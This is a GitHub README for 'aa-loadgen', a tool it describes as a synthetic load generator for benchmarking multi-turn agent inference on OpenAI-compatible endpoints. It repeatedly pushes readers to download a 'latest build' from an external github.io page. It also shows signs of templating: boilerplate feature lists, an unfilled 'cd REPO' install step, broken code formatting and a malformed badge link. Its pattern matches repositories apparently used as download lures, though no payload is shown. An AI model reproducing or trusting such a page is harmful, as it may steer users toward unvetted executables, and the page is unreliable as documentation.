# aa-loadgen v2026 - load generator 2026

> **An AA-AgentPerf-style synthetic load generator for benchmarking multi-turn agent inference, built for OpenAI-compatible chat completions endpoints and calibrated for version 2026 workload testing.**

[![Platform](https://img.shields.io/badge/Platform-OpenAI-compatible%20chat%20completions%20endpoint-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noah-carterdv8818/aa-loadgen-inference-loader-2026?style=flat-square)](https://github.com/noah-carterdv8818/aa-loadgen-inference-loader-2026)

---

<p align="center">
  <a href="https://noah-carterdv8818.github.io/aa-loadgen-inference-loader-2026/">
    <img src="https://img.shields.io/badge/Download-aa--loadgen%20Latest-brightgreen?style=for-the-badge" alt="Download aa-loadgen">
  </a>
</p>

> **[Direct Download - aa-loadgen v2026](https://noah-carterdv8818.github.io/aa-loadgen-inference-loader-2026/)**

---

[Download Latest Build](https://noah-carterdv8818.github.io/aa-loadgen-inference-loader-2026/)

---

## Overview

aa-loadgen generates synthetic traffic for AA-AgentPerf-style evaluation of agentic inference systems. It targets OpenAI-compatible chat completions endpoints and drives them with multi-turn sessions, varied request patterns, and workload shapes that approximate interactive agent behavior.

The tool is useful when you want to compare serving stacks, inspect scheduler behavior, or understand how a system responds to sequence growth, KV cache pressure, and program-aware routing. Its purpose is to keep benchmark runs representative of real multi-turn usage while still remaining controlled enough for meaningful comparisons.

---

## Capabilities

- Simulates multi-turn sessions for agent-oriented benchmark runs
- Uses realistic sequence length distribution to shape synthetic traffic
- Includes simulated tool latency to mimic request timing more closely
- Supports program-aware session IDs for routing-focused testing
- Enables fair A/B benchmarking across serving configurations
- Produces performance metrics for analysis and review
- Generates synthetic load for OpenAI-compatible chat completions endpoints
- Structured for benchmark testing of agentic inference serving systems

---

## Installation

Clone the repository and change into the project directory:

`git clone https://github.com/noah-carterdv8818/aa-loadgen-inference-loader-2026.git
`cd REPO`

For packaged releases, download the latest build from the project page and copy it into your working directory. From there, start it with the runtime or serving environment you normally use for OpenAI-compatible endpoints.

---

## Usage

Begin by directing aa-loadgen to the chat completions endpoint you want to measure. Set the session layout, turn count, and timing model, then execute a load profile that matches the scenario under test.

Typical workflow:

1. Pick the endpoint to test.
2. Describe the multi-turn session pattern.
3. Select the synthetic sequence distribution.
4. Enable tool-latency simulation if required.
5. Run the benchmark and gather metrics.
6. Compare variants for A/B analysis.

Example run outline:

`./aa-loadgen --endpoint https://your-endpoint.example --sessions 100 --turns 8 --profile agentic`

Tune the flags to fit the scheduler, cache, and routing situation you want to examine. When comparing systems, keep the workload definition identical across runs so the results stay fair.

---

## Configuration

You can supply configuration through CLI flags, environment variables, or a run profile file, depending on how you fit the generator into your benchmark process.

Example structure:

`endpoint = "https://your-endpoint.example"`
`sessions = 100`
`turns = 8`
`simulate_tool_latency = true`
`sequence_distribution = "realistic"`
`session_id_mode = "program-aware"`

To keep results reproducible, version your benchmark settings together with the notes from each run.

---

## Requirements

- OpenAI-compatible chat completions endpoint
- A system capable of handling synthetic multi-turn traffic
- Enough compute and network capacity for the benchmark size you choose
- Storage for logs, traces, and performance metric output
- A runtime or execution environment appropriate for your build or release package

---

## FAQ

**What is aa-loadgen for?**  
It is intended for benchmarking and performance testing of agentic inference serving stacks, not for general-purpose chat applications.

**Can it be used to compare two serving setups?**  
Yes. It includes fair A/B benchmarking workflows and reporting to help with side-by-side evaluation.

**Where do I adjust workload behavior?**  
Check the endpoint settings, session sizing, turn counts, tool-latency simulation, and sequence distribution options in the configuration for your run.

**What if the results fluctuate too much?**  
Confirm that the same session model, endpoint settings, and load profile are being reused, and make sure scheduler and cache-related conditions have not changed between tests.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
